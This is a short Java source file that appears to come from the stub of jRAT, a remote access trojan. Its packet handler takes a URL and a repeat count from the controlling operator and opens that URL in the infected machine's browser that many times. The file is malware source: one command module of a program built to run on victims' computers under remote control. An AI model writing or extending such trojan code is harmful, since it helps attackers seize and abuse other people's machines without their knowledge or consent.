package se.jrat.stub.packets.incoming;

import java.net.URI;

import se.jrat.stub.Connection;


public class Packet39VisitManyURLs extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		int times = con.readInt();
		try {
			for (int i = 0; i < times; i++) {
				java.awt.Desktop.getDesktop().browse(new URI(url));
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
